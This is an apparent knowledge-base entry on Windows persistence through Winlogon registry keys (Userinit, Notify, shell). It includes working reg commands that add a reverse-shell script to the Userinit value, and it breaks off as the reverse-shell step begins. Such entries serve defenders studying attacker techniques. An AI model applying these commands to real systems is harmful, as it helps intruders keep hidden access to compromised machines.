description: Boot or Logon Autostart Execution - Winlogon Helper DLL.
extended_description: |

    Adversaries may abuse features of [Winlogon]() to execute [DLLs and/or executables]() when a [user]() logs in. [Winlogon.exe]() is a Windows component responsible for actions at logon/logoff as well as the secure attention sequence (SAS) triggered by Ctrl-Alt-Delete.

    [Registry entries]() in
    ```
    HKLM\Software[\Wow6432Node\]\Microsoft\Windows NT\CurrentVersion\Winlogon\
    HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\
    ```
    are used to manage additional helper programs and functionalities that support Winlogon.

    | [File](/artifacts/A_3002_file/entity)                                           | File with malicious code   | Code execution to gain persistense                                 |
    | **Side Observables**                                                            |
    | [Windows Registry](/artifacts/A_5002_windows_registry/entity)                   | Userinit subkey          | Registry subkeys have been known to be possibly vulnerable to abuse|


    ## Attack results

    Adversaries may take advantage of these features to repeatedly execute [malicious code]() and establish [persistence]().

    |-----------------------------------------------------------------------|-------------------------------------------------------------------------------------------|
    | **Attack Prerequisites**                                              |                                                                                           |
    | [Privileged Access]()                                                 | Compromised host with privileged access |
    | **Result Consequences**                                               |                                                                                           |
    | [Remote Code Execution]()                                             | Attacker gets an ability to execute commands on the remote host |
    | [Persistense]()                                                       | Attacker can use reverse shell as a payload to establish access to the host |

    ## Attack progress
    1) Commonly abused Winlogon registry keys and value for persistence are:
    ```
    HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Userinit
    HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\Notify
    HKCU\Software\Microsoft\Windows NT\CurrentVersion\Winlogon\shell
    ```

    HKCU can also be replaced with HKLM for a system wide persistence, if you have [admin privileges]().

    2) Let's run through the techqnique abusing the userinit subkey.
    Let's see what's currently held at the userinit:
    ```
    reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit
    ```
    Let's now add an additional item shell.cmd (a simple reverse netcat shell) to the list that we want to be launched when the compromised machine reboots:
    ```
    reg add "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon" /v userinit /d C:\Windows\system32\userinit.exe,C:\tools\shell.cmd /t reg_sz /f
    ```

    ## Possible usage

    ### Reverse shell
    1) Rebooting the compromised system executes the c:\tools\shell.cmd, which in turn establishes a reverse shell to the attacking system:
